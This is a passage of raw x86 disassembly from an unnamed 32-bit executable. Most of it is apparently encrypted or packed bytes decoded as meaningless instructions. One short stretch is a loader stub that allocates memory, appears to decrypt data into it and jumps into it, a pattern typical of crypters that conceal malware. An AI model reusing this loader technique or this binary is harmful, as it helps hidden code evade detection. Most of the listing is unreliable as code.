  41515e:	xchg   ebp,eax
  41515f:	pop    esp
  415160:	push   eax
  415161:	mov    esi,0x63857b4f
  415166:	pop    ebp
  415167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415168:	xchg   DWORD PTR [edx+esi*4],ebp
  41516b:	(bad)  
  41516c:	fidiv  WORD PTR ds:0xeb411860
  415172:	xlat   BYTE PTR ds:[ebx]
  415173:	push   ecx
  415174:	dec    esi
  415175:	add    ebp,DWORD PTR [ecx+0x4481052c]
  41517b:	fistp  WORD PTR [edi-0x24]
  41517e:	add    eax,0xe1c00c4f
  415183:	ret    0x13ab
  415186:	in     eax,0x28
  415188:	mov    eax,ds:0xdca162d
  41518d:	test   eax,0x4b505562
  415192:	cmp    eax,0x3ca7b0b3
  415197:	cmp    al,0xfa
  415199:	sub    al,0xfd
  41519b:	aaa    
  41519c:	jle    0x41513e
  41519e:	dec    eax
  41519f:	imul   esi,DWORD PTR [esi-0x37935ad1],0x699b1437
  4151a9:	or     eax,0xa43d5524
  4151ae:	pop    esi
  4151af:	xor    edi,DWORD PTR [ebx+0x71]
  4151b2:	in     al,0x52
  4151b4:	mov    ch,0x4a
  4151b6:	push   esp
  4151b7:	cmp    eax,0x96dd488b
  4151bc:	and    eax,0x1b29c928
  4151c1:	fdivrp st(7),st
  4151c3:	call   0x92481a96
  4151c8:	icebp  
  4151c9:	daa    
  4151ca:	jge    0x4151e6
  4151cc:	leave  
  4151cd:	int3   
  4151ce:	cmp    ecx,DWORD PTR [edi+edi*1-0x24]
  4151d2:	or     DWORD PTR [esi],ecx
  4151d4:	call   0x9c1d8712
  4151d9:	inc    eax
  4151da:	push   ebp
  4151db:	stc    
  4151dc:	or     BYTE PTR [eax],al
  4151de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151df:	je     0x4151fe
  4151e1:	pop    ecx
  4151e2:	rcr    DWORD PTR [ebx+0x65],1
  4151e5:	adc    al,0xcc
  4151e7:	xor    al,0x1f
  4151e9:	arpl   bp,bx
  4151eb:	dec    edx
  4151ec:	and    al,0x57
  4151ee:	dec    DWORD PTR [ebp+0x5adde383]
  4151f4:	aas    
  4151f5:	sbb    DWORD PTR [eax+0x6a],edi
  4151f8:	jle    0x415271
  4151fa:	push   ebx
  4151fb:	arpl   WORD PTR [edi],si
  4151fd:	mov    DWORD PTR [edx-0x3cad8b8e],ebp
  415203:	mov    dh,0xf1
  415205:	pop    es
  415206:	add    ecx,ecx
  415208:	sti    
  415209:	out    dx,eax
  41520a:	ret    0xd253
  41520d:	bswap  ebp
  41520f:	xchg   ecx,eax
  415210:	les    esp,FWORD PTR [ecx+edi*4-0x7de9caa3]
  415217:	sahf   
  415218:	aam    0x5a
  41521a:	or     eax,0xca9301c8
  41521f:	es cmova esp,esp
  415223:	rcr    BYTE PTR [edx],1
  415225:	pop    ebx
  415226:	les    esp,FWORD PTR [ebx-0x3af3a89f]
  41522c:	nop
  41522d:	pop    esi
  41522e:	pop    edx
  41522f:	and    DWORD PTR [esi-0x72],ecx
  415232:	sti    
  415233:	add    cl,BYTE PTR [ecx+0x2bc0d05c]
  415239:	div    BYTE PTR [ecx+0x5379949d]
  41523f:	ins    DWORD PTR es:[edi],dx
  415240:	pop    ds
  415241:	pop    edi
  415242:	div    DWORD PTR ds:0xfcb18559
  415248:	in     eax,dx
  415249:	inc    ebx
  41524a:	xor    BYTE PTR [ebx],0xc1
  41524d:	popa   
  41524e:	stc    
  41524f:	mov    ah,BYTE PTR [edx+esi*8+0x2c8b9a94]
  415256:	sub    edi,ebp
  415258:	mov    cl,0xba
  41525a:	aas    
  41525b:	push   edx
  41525c:	add    al,0x70
  41525e:	xchg   ecx,eax
  41525f:	inc    ebx
  415260:	fstp   DWORD PTR [ecx+0x2e243190]
  415266:	pop    ss
  415267:	cmp    dh,BYTE PTR [ebx]
  415269:	jb     0x415270
  41526b:	sbb    DWORD PTR [ecx+0x4a0db810],ebx
  415271:	loope  0x415245
  415273:	cmp    BYTE PTR [ecx],dl
  415275:	sub    DWORD PTR [esi-0x293340d8],ebx
  41527b:	fs cmc 
  41527d:	in     al,0x26
  41527f:	jae    0x4152f9
  415281:	adc    al,0xe
  415283:	data16 adc cl,ch
  415286:	mov    ds:0x81fabea7,al
  41528b:	mov    ch,dl
  41528d:	adc    DWORD PTR [esi+edx*4-0xc],esi
  415291:	or     DWORD PTR [edx+0x6],esi
  415294:	repnz pop ebx
  415296:	rol    BYTE PTR [ecx+0xf],1
  415299:	jecxz  0x4152d3
  41529b:	inc    edi
  41529c:	push   0xffffffa8
  41529e:	add    bh,BYTE PTR [eax-0x28]
  4152a1:	(bad)  
  4152a2:	sti    
  4152a3:	sbb    eax,0x14a542b
  4152a8:	mov    bh,0xa4
  4152aa:	mov    esp,0xb8371f58
  4152af:	xor    al,0x5
  4152b1:	mov    ebp,esi
  4152b3:	addr16 mov esi,0x46ee9829
  4152b9:	in     al,0x5d
  4152bb:	jl     0x415252
  4152bd:	retf   0xd498
  4152c0:	mov    ebx,DWORD PTR [esi]
  4152c2:	or     al,0x3c
  4152c4:	dec    eax
  4152c5:	xchg   ebp,eax
  4152c6:	repz inc DWORD PTR fs:[ecx-0x5d]
  4152cb:	loope  0x415289
  4152cd:	pusha  
  4152ce:	cs xchg ebx,eax
  4152d0:	das    
  4152d1:	pop    ss
  4152d2:	int3   
  4152d3:	fwait
  4152d4:	and    edx,DWORD PTR [ebx-0x1]
  4152d7:	adc    eax,0x417014
  4152dc:	mov    DWORD PTR [ebp-0x2c],eax
  4152df:	movzx  eax,WORD PTR [ebp-0x2c]
  4152e3:	cmp    eax,0x539
  4152e8:	jne    0x415319
  4152ea:	mov    DWORD PTR [ebp-0x14],0xe0d
  4152f1:	lea    ecx,[ebp-0x28]
  4152f4:	push   ecx
  4152f5:	call   DWORD PTR ds:0x417018
  4152fb:	mov    DWORD PTR [ebp-0x60],eax
  4152fe:	mov    DWORD PTR [ebp-0x54],0x3a
  415305:	mov    BYTE PTR [ebp-0x34],0x0
  415309:	mov    DWORD PTR [ebp-0x8],0x6a17016
  415310:	mov    DWORD PTR [ebp-0x68],0x122d67
  415317:	jmp    0x41532e
  415319:	mov    BYTE PTR ds:0x417038,0x0
  415320:	push   0x42cfc8
  415325:	call   DWORD PTR ds:0x417018
  41532b:	mov    DWORD PTR [ebp-0x2c],eax
  41532e:	push   0x0
  415330:	call   DWORD PTR ds:0x417018
  415336:	mov    DWORD PTR [ebp-0x2c],eax
  415339:	push   DWORD PTR ds:0x417018
  41533f:	pop    edx
  415340:	mov    DWORD PTR [ebp-0x6c],edx
  415343:	lea    edx,[ebp-0x40]
  415346:	push   edx
  415347:	mov    eax,DWORD PTR [ebp-0x60]
  41534a:	push   eax
  41534b:	call   DWORD PTR ds:0x417024
  415351:	mov    DWORD PTR [ebp-0x44],eax
  415354:	push   DWORD PTR [ebp-0x30]
  415357:	push   0x1000
  41535c:	mov    eax,DWORD PTR [ebp-0x14]
  41535f:	add    eax,0x23
  415362:	add    eax,0x23
  415365:	push   eax
  415366:	xor    eax,eax
  415368:	push   eax
  415369:	mov    ecx,DWORD PTR [ebp-0x44]
  41536c:	call   ecx
  41536e:	push   eax
  41536f:	pop    ecx
  415370:	mov    DWORD PTR [ebp-0x4],ecx
  415373:	mov    ecx,DWORD PTR [ebp-0x68]
  415376:	sub    ecx,0xdae0b
  41537c:	mov    DWORD PTR [ebp-0x68],ecx
  41537f:	cmp    DWORD PTR [ebp-0x4],0x0
  415383:	jne    0x41539d
  415385:	push   0x0
  415387:	push   0x0
  415389:	call   0x416a5c
  41538e:	push   0x0
  415390:	call   DWORD PTR ds:0x41702c
  415396:	mov    BYTE PTR ds:0x447f40,0x0
  41539d:	mov    edx,DWORD PTR [ebp-0x4]
  4153a0:	add    edx,DWORD PTR [ebp-0x14]
  4153a3:	mov    eax,DWORD PTR [ebp-0x8]
  4153a6:	mov    DWORD PTR [edx],eax
  4153a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4153ab:	add    ecx,DWORD PTR [ebp-0x54]
  4153ae:	mov    DWORD PTR [ebp-0x5c],ecx
  4153b1:	mov    edx,DWORD PTR ds:0x417024
  4153b7:	mov    DWORD PTR [ebp-0x4c],edx
  4153ba:	mov    eax,DWORD PTR [ebp-0x4]
  4153bd:	add    eax,DWORD PTR [ebp-0x14]
  4153c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4153c3:	mov    DWORD PTR [eax+0x4],ecx
  4153c6:	mov    edx,DWORD PTR [ebp-0x4]
  4153c9:	add    edx,DWORD PTR [ebp-0x14]
  4153cc:	mov    DWORD PTR [ebp-0xc],edx
  4153cf:	cmp    DWORD PTR [ebp-0x68],0x0
  4153d3:	jbe    0x4153f0
  4153d5:	mov    eax,DWORD PTR [ebp-0xc]
  4153d8:	push   eax
  4153d9:	mov    ecx,DWORD PTR [ebp-0x14]
  4153dc:	push   ecx
  4153dd:	mov    edx,DWORD PTR [ebp-0x2c]
  4153e0:	add    edx,DWORD PTR [ebp-0x68]
  4153e3:	push   edx
  4153e4:	mov    eax,DWORD PTR [ebp-0x4]
  4153e7:	push   eax
  4153e8:	call   0x41696e
  4153ed:	add    esp,0x10
  4153f0:	cmp    DWORD PTR [ebp-0x5c],0x0
  4153f4:	je     0x415404
  4153f6:	push   DWORD PTR [ebp-0x4c]
  4153f9:	push   DWORD PTR [ebp-0x6c]
  4153fc:	mov    ecx,DWORD PTR [ebp-0x5c]
  4153ff:	push   ecx
  415400:	jmp    ecx
  415402:	jmp    0x41540a
  415404:	mov    ecx,DWORD PTR [ebp+0x8]
  415407:	mov    DWORD PTR [ebp-0x18],ecx
  41540a:	mov    eax,0x1
  41540f:	mov    esp,ebp
  415411:	pop    ebp
  415412:	ret    
  415413:	push   ebp
  415414:	mov    ebp,esp
  415416:	pop    ebp
  415417:	ret    
  415418:	push   ebp
  415419:	mov    ebp,esp
  41541b:	sub    esp,0x54
  41541e:	mov    DWORD PTR [ebp-0x34],0x0
  415425:	mov    DWORD PTR [ebp-0x4],0x0
  41542c:	mov    DWORD PTR [ebp-0x50],0x0
  415433:	mov    DWORD PTR [ebp-0x4c],0x0
  41543a:	mov    DWORD PTR [ebp-0x30],0x0
  415441:	lea    eax,[ebp-0x38]
  415444:	push   eax
  415445:	push   0x8
  415447:	call   DWORD PTR ds:0x417020
  41544d:	call   DWORD PTR ds:0x417014
  415453:	mov    DWORD PTR [ebp-0x30],eax
  415456:	lea    ecx,[ebp-0x48]
  415459:	push   ecx
  41545a:	call   DWORD PTR ds:0x417010
  415460:	mov    edx,DWORD PTR [ebp-0x34]
  415463:	push   edx
  415464:	call   0x415493
  415469:	add    esp,0x4
  41546c:	call   0x41695f
  415471:	mov    DWORD PTR [ebp-0x54],0x0
  415478:	jmp    0x415483
  41547a:	mov    eax,DWORD PTR [ebp-0x54]
  41547d:	add    eax,0x1
  415480:	mov    DWORD PTR [ebp-0x54],eax
  415483:	cmp    DWORD PTR [ebp-0x54],0x64
  415487:	jae    0x41548b
  415489:	jmp    0x41547a
  41548b:	xor    eax,eax
  41548d:	mov    esp,ebp
  41548f:	pop    ebp
  415490:	ret    0x10
  415493:	push   ebp
  415494:	mov    ebp,esp
  415496:	sub    esp,0x3c
  415499:	push   esi
  41549a:	mov    DWORD PTR [ebp-0x3c],0x0
  4154a1:	mov    DWORD PTR [ebp-0x38],0x0
  4154a8:	mov    DWORD PTR [ebp-0x30],0x0
  4154af:	mov    DWORD PTR [ebp-0x24],0x0
  4154b6:	mov    DWORD PTR [ebp-0x1c],0x0
  4154bd:	mov    DWORD PTR [ebp-0x28],0x0
  4154c4:	mov    DWORD PTR [ebp-0x2c],0x448fc8
  4154cb:	mov    DWORD PTR [ebp-0x24],0xa4a5b4d4
  4154d2:	mov    DWORD PTR [ebp-0x34],0x0
  4154d9:	mov    eax,DWORD PTR [ebp-0x24]
  4154dc:	mov    DWORD PTR [ebp-0x20],eax
  4154df:	mov    DWORD PTR [ebp-0x4],0x0
  4154e6:	mov    ecx,DWORD PTR ds:0x417014
  4154ec:	mov    DWORD PTR [ebp-0x4],ecx
  4154ef:	push   0x0
  4154f1:	push   0x4e
  4154f3:	push   0x1e
  4154f5:	push   0x0
  4154f7:	push   0xffffffff
  4154f9:	call   DWORD PTR ds:0x41701c
  4154ff:	test   eax,eax
  415501:	je     0x41693e
  415507:	stos   BYTE PTR es:[edi],al
  415508:	inc    ebp
  415509:	out    dx,eax
  41550a:	mov    bh,0x42
  41550c:	test   BYTE PTR [ebx-0x76],bh
  41550f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415510:	out    0x89,eax
  415512:	pop    ecx
  415513:	push   cs
  415514:	sbb    BYTE PTR [edi],bl
  415516:	jg     0x415527
  415518:	inc    ecx
  415519:	test   BYTE PTR [ebx-0x76],bh
  41551c:	mov    eax,ds:0xf11989e7
  415521:	out    0x1f,eax
  415523:	jg     0x4154dc
  415525:	inc    ecx
  415526:	test   BYTE PTR [ebx-0x76],bh
  415529:	mov    eax,ds:0xf15989e7
  41552e:	out    0x1f,eax
  415530:	jg     0x4154e9
  415532:	inc    ecx
  415533:	test   BYTE PTR [ebx-0x76],bh
  415536:	mov    eax,ds:0xf15989e7
  41553b:	out    0x1f,eax
  41553d:	jg     0x4154f6
  41553f:	inc    ecx
  415540:	test   BYTE PTR [ebx-0x76],bh
  415543:	test   eax,0xff5989e6
  415548:	clc    
  415549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41554a:	jno    0x415503
  41554c:	cmc    
  41554d:	lea    esi,[esi-0x3a19e655]
  415553:	xchg   esp,eax
  415554:	shl    BYTE PTR [ebx+0x61c41677],1
  41555a:	hlt    
  41555b:	or     ebp,esp
  41555d:	(bad)  
  41555e:	xchg   ebp,eax
  41555f:	call   0x7ec62698
  415564:	adc    ecx,ebx
  415566:	cs lock pop ebx
  415569:	call   0x2d3d1d32
  41556e:	lahf   
  41556f:	(bad)  
  415570:	jbe    0x415583
  415572:	xchg   edi,eax
  415573:	add    eax,0xccaa28cb
  415578:	mov    ch,ch
  41557a:	cmp    al,0xdf
  41557c:	jmp    0x7b84:0x41937512
  415583:	mov    ah,BYTE PTR [ecx+0x3e2389e7]
  415589:	icebp  
  41558a:	xchg   ecx,eax
  41558b:	inc    ecx
  41558c:	sbb    DWORD PTR [ecx],edi
  41558e:	pop    ecx
  41558f:	inc    ebp
  415590:	and    al,0xd9
  415592:	cmp    dh,BYTE PTR [edi+0x3a3a89f7]
  415598:	dec    esp
  415599:	push   ecx
  41559a:	pushf  
  41559b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41559c:	aad    0xf2
  41559e:	jl     0x415562
  4155a0:	mov    edx,0xb1582c8b
  4155a5:	pop    es
  4155a6:	push   0x64
  4155a8:	mov    bh,0xa8
  4155aa:	push   edi
  4155ab:	mov    ah,0x49
  4155ad:	icebp  
  4155ae:	test   BYTE PTR [eax-0x735d33c1],ah
  4155b4:	out    dx,eax
  4155b5:	cld    
  4155b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155b7:	mov    ebp,0x6e541c77
  4155bc:	pop    edi
  4155bd:	lahf   
  4155be:	ret    0x6148
  4155c1:	stos   BYTE PTR es:[edi],al
  4155c2:	pop    ecx
  4155c3:	pop    esi
  4155c4:	and    al,0xd9
  4155c6:	cmp    dh,BYTE PTR [edi+0x563a88f7]
  4155cc:	ror    bh,1
  4155ce:	pushf  
  4155cf:	inc    esi
  4155d0:	cmc    
  4155d1:	loopne 0x41564f
  4155d3:	xlat   BYTE PTR ds:[ebx]
  4155d4:	daa    
  4155d5:	and    DWORD PTR [edx+eax*8],ebp
  4155d8:	sub    al,0xa8
  4155da:	push   0x38
  4155dc:	sub    al,BYTE PTR [ebx]
  4155de:	push   edi
  4155df:	test   ah,dl
  4155e1:	imul   eax,DWORD PTR [esi+ecx*8-0x6d5d98b7],0x72
  4155e9:	popa   
  4155ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155eb:	mov    ch,0xf
  4155ed:	lahf   
  4155ee:	push   esp
  4155ef:	or     ebx,DWORD PTR [eax+0x19417784]
  4155f5:	cmp    DWORD PTR [ecx+0x7b],ebx
  4155f8:	mov    ah,BYTE PTR [ecx-0xea67619]
  4155fe:	out    0x1f,eax
  415600:	jg     0x4155b9
  415602:	inc    ecx
  415603:	test   BYTE PTR [ebx-0x76],bh
  415606:	mov    eax,ds:0xf15989e7
  41560b:	out    0x1f,eax
  41560d:	jg     0x4155c6
  41560f:	adc    ecx,eax
  415611:	jnp    0x41559d
  415613:	in     eax,dx
  415614:	out    0x8a,al
  415616:	pop    ecx
  415617:	xchg   edi,eax
  415618:	test   eax,0x41b73052
  41561d:	test   BYTE PTR [ebx-0x76],bh
  415620:	mov    eax,ds:0xf1b989e7
  415625:	in     eax,0x1e
  415627:	je     0x4155df
  415629:	dec    ebx
  41562a:	test   BYTE PTR [ebx+0x68],bh
  41562d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41562e:	out    0x89,eax
  415630:	(bad)  
  415632:	out    0x1f,eax
  415634:	jg     0x4155ed
  415636:	inc    ecx
  415637:	mov    esi,0x99e7a18a
  41563d:	pop    ecx
  41563e:	icebp  
  41563f:	out    0x1f,eax
  415641:	jp     0x4155fa
  415643:	inc    ecx
  415644:	test   BYTE PTR [ebx],bh
  415646:	mov    ah,BYTE PTR [ecx-0xea67609]
  41564c:	in     eax,0x1f
  41564e:	jg     0x415602
  415650:	inc    ecx
  415651:	test   DWORD PTR [ebx-0x76],edi
  415654:	mov    eax,ds:0xf15c89e7
  415659:	out    0x1f,al
  41565b:	jg     0x415614
  41565d:	inc    ecx
  41565e:	test   BYTE PTR [ebx-0x46],bh
  415661:	lods   eax,DWORD PTR ds:[esi]
  415662:	out    0x89,eax
  415664:	pop    ebp
  415665:	icebp  
  415666:	out    0x15,eax
  415668:	xor    DWORD PTR [ebx-0x358479bf],0x4989e720
  415672:	icebp  
  415673:	out    0xf,eax
  415675:	jg     0x41562e
  415677:	inc    ecx
  415678:	test   BYTE PTR [ebx-0x76],ch
  41567b:	mov    eax,ds:0xf15989f7
  415680:	out    0x1f,eax
  415682:	jg     0x41562b
  415684:	inc    ecx
  415685:	test   BYTE PTR [ebx-0x76],bh
  415688:	mov    eax,ds:0xf15989e7
  41568d:	out    0x1f,eax
  41568f:	jnp    0x415648
  415691:	dec    ebp
  415692:	test   BYTE PTR [edx],ah
  415694:	mov    DWORD PTR [ecx-0x5667619],esp
  41569a:	out    0x4a,eax
  41569c:	inc    eax
  41569d:	mov    bh,0x41
  41569f:	test   BYTE PTR [ebx-0x76],bh
  4156a2:	mov    eax,ds:0xf15989e7
  4156a7:	out    0x1f,eax
  4156a9:	jg     0x415662
  4156ab:	inc    ecx
  4156ac:	test   BYTE PTR [ebx-0x76],bh
  4156af:	mov    eax,ds:0xe95985c7
  4156b4:	out    0x1f,eax
  4156b6:	jg     0x41566f
  4156b8:	inc    ecx
  4156b9:	test   BYTE PTR [ebx-0x76],bh
  4156bc:	mov    eax,ds:0xf15989e7
  4156c1:	out    0x1f,eax
  4156c3:	jg     0x41567c
  4156c5:	inc    ecx
  4156c6:	test   BYTE PTR [ebx-0x76],bh
  4156c9:	mov    eax,ds:0xf15989e7
  4156ce:	out    0x1f,eax
  4156d0:	jg     0x415689
  4156d2:	inc    ecx
  4156d3:	test   BYTE PTR [ebx-0x76],bh
  4156d6:	mov    eax,ds:0xf15989e7
  4156db:	out    0x1f,eax
  4156dd:	jg     0x415696
  4156df:	inc    ecx
  4156e0:	test   BYTE PTR [ebx-0x76],bh
  4156e3:	mov    eax,ds:0xf15989e7
  4156e8:	out    0x1f,eax
  4156ea:	jg     0x4156a3
  4156ec:	inc    ecx
  4156ed:	test   BYTE PTR [ebx-0x76],bh
  4156f0:	mov    eax,ds:0xf15989e7
  4156f5:	out    0x1f,eax
  4156f7:	jg     0x4156b0
  4156f9:	inc    ecx
  4156fa:	test   BYTE PTR [ebx-0x76],bh
  4156fd:	mov    eax,ds:0xf15989e7
  415702:	out    0x1f,eax
  415704:	jg     0x4156bd
  415706:	inc    ecx
  415707:	stos   BYTE PTR es:[edi],al
  415708:	pxor   mm3,mm1
  41570b:	xchg   ebx,eax
  41570c:	mov    DWORD PTR [ecx-0xf],ebx
  41570f:	out    0xaf,eax
  415711:	je     0x4156ca
  415713:	inc    ecx
  415714:	xchg   esp,eax
  415715:	jnp    0x4156a1
  415717:	mov    eax,ds:0xf1598d81
  41571c:	jecxz  0x41573d
  41571e:	jg     0x415707
  415720:	add    al,0xc7
  415722:	dec    ecx
  415723:	fsubp  st(6),st
  415725:	out    0x89,eax
  415727:	pop    ecx
  415728:	icebp  
  415729:	out    0x1f,eax
  41572b:	pop    edi
  41572c:	mov    bh,0x41
  41572e:	fs push ebp
  415730:	clc    
  415731:	rcl    BYTE PTR [ebp-0x180ea616],cl
  415737:	pop    ds
  415738:	pop    ds
  415739:	mov    bh,0x41
  41573b:	test   BYTE PTR [ebx-0x24185e7f],bh
  415741:	pop    ecx
  415742:	icebp  
  415743:	out    0x75,eax
  415745:	jnp    0x4156fe
  415747:	inc    ecx
  415748:	test   BYTE PTR [ebx-0x76],bh
  41574b:	mov    eax,ds:0xf15989e7
  415750:	out    0x1f,eax
  415752:	jg     0x4156eb
  415754:	inc    ecx
  415755:	test   BYTE PTR [ebx-0x1a7d2c5c],bl
  41575b:	ss xchg edx,eax
  41575d:	out    0x1f,eax
  41575f:	jg     0x415716
  415761:	inc    ecx
  415762:	test   BYTE PTR [ebx-0x56],bh
  415765:	lods   eax,DWORD PTR ds:[esi]
  415766:	out    0x89,eax
  415768:	pop    ebx
  415769:	icebp  
  41576a:	out    0x1f,eax
  41576c:	ret    
  41576d:	mov    bl,0x41
  41576f:	test   BYTE PTR [ebx-0x76],bh
  415772:	mov    eax,ds:0xf15989e7
  415777:	out    0x1f,eax
  415779:	jg     0x415732
  41577b:	add    DWORD PTR [ebx+edi*2-0x76185eb6],eax
  415782:	pop    ecx
  415783:	icebp  
  415784:	out    0x1f,eax
  415786:	jg     0x41573f
  415788:	inc    ecx
  415789:	test   BYTE PTR [ebx-0x76],bh
  41578c:	mov    eax,ds:0xf15989e7
  415791:	out    0x1f,eax
  415793:	jg     0x41574c
  415795:	inc    ecx
  415796:	test   BYTE PTR [ebx-0x76],bh
  415799:	mov    eax,ds:0xf15989e7
  41579e:	out    0x1f,eax
  4157a0:	jg     0x415759
  4157a2:	inc    ecx
  4157a3:	test   BYTE PTR [ebx-0x76],bh
  4157a6:	mov    eax,ds:0xf15989e7
  4157ab:	out    0x1f,eax
  4157ad:	jg     0x415766
  4157af:	inc    ecx
  4157b0:	test   BYTE PTR [ebx-0x76],bh
  4157b3:	mov    eax,ds:0xf15989e7
  4157b8:	out    0x1f,eax
  4157ba:	jg     0x415773
  4157bc:	inc    ecx
  4157bd:	test   BYTE PTR [ebx-0x76],bh
  4157c0:	mov    eax,ds:0xf15989e7
  4157c5:	out    0x1f,eax
  4157c7:	jg     0x415780
  4157c9:	inc    ecx
  4157ca:	test   BYTE PTR [ebx-0x76],bh
  4157cd:	mov    eax,ds:0xf15989e7
  4157d2:	out    0x1f,eax
  4157d4:	jg     0x41578d
  4157d6:	inc    ecx
  4157d7:	test   BYTE PTR [ebx-0x76],bh
  4157da:	mov    eax,ds:0xf15989e7
  4157df:	out    0x1f,eax
  4157e1:	jg     0x41579a
  4157e3:	inc    ecx
  4157e4:	test   BYTE PTR [ebx-0x76],bh
  4157e7:	mov    eax,ds:0xf15989e7
  4157ec:	out    0x1f,eax
  4157ee:	jg     0x4157a7
  4157f0:	inc    ecx
  4157f1:	test   BYTE PTR [ebx-0x76],bh
  4157f4:	mov    eax,ds:0xf15989e7
  4157f9:	out    0x1f,eax
  4157fb:	jg     0x4157b4
  4157fd:	inc    ecx
  4157fe:	test   BYTE PTR [ebx-0x76],bh
  415801:	mov    eax,ds:0xf15989e7
  415806:	out    0x1f,eax
  415808:	jg     0x4157c1
  41580a:	inc    ecx
  41580b:	test   BYTE PTR [ebx-0x76],bh
  41580e:	mov    eax,ds:0xf15989e7
  415813:	out    0x1f,eax
  415815:	jg     0x4157ce
  415817:	inc    ecx
  415818:	test   BYTE PTR [ebx-0x76],bh
  41581b:	mov    eax,ds:0xf15989e7
  415820:	out    0x1f,eax
  415822:	jg     0x4157db
  415824:	inc    ecx
  415825:	test   BYTE PTR [ebx-0x76],bh
  415828:	mov    eax,ds:0xf15989e7
  41582d:	out    0x1f,eax
  41582f:	jg     0x4157e8
  415831:	inc    ecx
  415832:	test   BYTE PTR [ebx-0x76],bh
  415835:	mov    eax,ds:0xf15989e7
  41583a:	out    0x1f,eax
  41583c:	jg     0x4157f5
  41583e:	inc    ecx
  41583f:	test   BYTE PTR [ebx-0x76],bh
  415842:	mov    eax,ds:0xf15989e7
  415847:	out    0x1f,eax
  415849:	jg     0x415802
  41584b:	inc    ecx
  41584c:	test   BYTE PTR [ebx-0x76],bh
  41584f:	mov    eax,ds:0xf15989e7
  415854:	out    0x1f,eax
  415856:	jg     0x41580f
  415858:	inc    ecx
  415859:	test   BYTE PTR [ebx-0x76],bh
  41585c:	mov    eax,ds:0xf15989e7
  415861:	out    0x1f,eax
  415863:	jg     0x41581c
  415865:	inc    ecx
  415866:	test   BYTE PTR [ebx-0x76],bh
  415869:	mov    eax,ds:0xf15989e7
  41586e:	out    0x1f,eax
  415870:	jg     0x415829
  415872:	inc    ecx
  415873:	test   BYTE PTR [ebx-0x76],bh
  415876:	mov    eax,ds:0xf15989e7
  41587b:	out    0x1f,eax
  41587d:	jg     0x415836
  41587f:	inc    ecx
  415880:	test   BYTE PTR [ebx-0x76],bh
  415883:	mov    eax,ds:0xf15989e7
  415888:	out    0x1f,eax
  41588a:	jg     0x415843
  41588c:	inc    ecx
  41588d:	test   BYTE PTR [ebx-0x76],bh
  415890:	mov    eax,ds:0xf15989e7
  415895:	out    0x1f,eax
  415897:	jg     0x415850
  415899:	inc    ecx
  41589a:	test   BYTE PTR [ebx-0x76],bh
  41589d:	mov    eax,ds:0xf15989e7
  4158a2:	out    0x1f,eax
  4158a4:	jg     0x41585d
  4158a6:	inc    ecx
  4158a7:	test   BYTE PTR [ebx-0x76],bh
  4158aa:	mov    eax,ds:0xf15989e7
  4158af:	out    0x1f,eax
  4158b1:	jg     0x41586a
  4158b3:	inc    ecx
  4158b4:	test   BYTE PTR [ebx-0x76],bh
  4158b7:	mov    eax,ds:0xf15989e7
  4158bc:	out    0x1f,eax
  4158be:	jg     0x415877
  4158c0:	inc    ecx
  4158c1:	test   BYTE PTR [ebx-0x76],bh
  4158c4:	mov    eax,ds:0xf15989e7
  4158c9:	out    0x1f,eax
  4158cb:	jg     0x415884
  4158cd:	inc    ecx
  4158ce:	test   BYTE PTR [ebx-0x76],bh
  4158d1:	mov    eax,ds:0xf15989e7
  4158d6:	out    0x1f,eax
  4158d8:	jg     0x415891
  4158da:	inc    ecx
  4158db:	test   BYTE PTR [ebx-0x76],bh
  4158de:	mov    eax,ds:0xf15989e7
  4158e3:	out    0x1f,eax
  4158e5:	jg     0x41589e
  4158e7:	inc    ecx
  4158e8:	test   BYTE PTR [ebx-0x76],bh
  4158eb:	mov    eax,ds:0xf15989e7
  4158f0:	out    0x1f,eax
  4158f2:	jg     0x4158ab
  4158f4:	inc    ecx
  4158f5:	test   BYTE PTR [ebx-0x76],bh
  4158f8:	mov    eax,ds:0xf15989e7
  4158fd:	out    0x1f,eax
  4158ff:	jg     0x4158b8
  415901:	inc    ecx
  415902:	test   BYTE PTR [ebx-0x76],bh
  415905:	mov    eax,ds:0xfa1722e7
  41590a:	out    0x30,eax
  41590c:	jg     0x4158c5
  41590e:	push   ecx
  41590f:	test   BYTE PTR [ebx-0x60],bh
  415912:	add    edi,DWORD PTR ds:0xd4bee4fd
  415918:	or     eax,0x6b7c8c54
  41591d:	into   
  41591e:	sbb    BYTE PTR [edi+0x2da8d0ae],ah
  415924:	push   esp
  415925:	or     al,0x38
  415927:	mov    WORD PTR [eax-0x2f370fa4],gs
  41592d:	and    eax,0xb9661673
  415932:	shr    BYTE PTR [ebx-0x6716dd09],0x31
  415939:	jo     0x4158fd
  41593b:	retf   0x7950
  41593e:	or     BYTE PTR [bp+si+0x7897],al
  415943:	mov    esp,0xa0ed8838
  415948:	push   ecx
  415949:	lds    esp,FWORD PTR [esi]
  41594b:	test   al,0x21
  41594d:	int3   
  41594e:	inc    ecx
  41594f:	mov    ch,0x9d
  415951:	ins    BYTE PTR es:[edi],dx
  415952:	les    edx,FWORD PTR [eax-0x4b]
  415955:	out    0xc5,al
  415957:	push   ss
  415958:	test   DWORD PTR [eax+0x297b1d8f],0x4d5dc1fe
  415962:	mov    di,0x70d0
  415966:	ret    
  415967:	sahf   
  415968:	sub    al,0x66
  41596a:	(bad)  
  41596b:	dec    esi
  41596c:	mov    fs,ecx
  41596e:	adc    ch,BYTE PTR [edi+0x62084c3d]
  415974:	inc    edi
  415975:	loop   0x41596d
  415977:	jo     0x415980
  415979:	fstp   TBYTE PTR [ecx+0x533c9cff]
  41597f:	ins    DWORD PTR es:[edi],dx
  415980:	cmp    ebx,DWORD PTR [ebp+eiz*1-0x5b]
  415984:	pop    ds
  415985:	sbb    ecx,esi
  415987:	mov    eax,0xa47d1e04
  41598c:	ja     0x415942
  41598e:	lea    ebp,[edx]
  415990:	xor    esp,edx
  415992:	pop    ebp
  415993:	fdivr  QWORD PTR [edi]
  415995:	arpl   WORD PTR [esi+ebx*1],bx
  415998:	js     0x4159b8
  41599a:	sub    eax,DWORD PTR [eax-0x69]
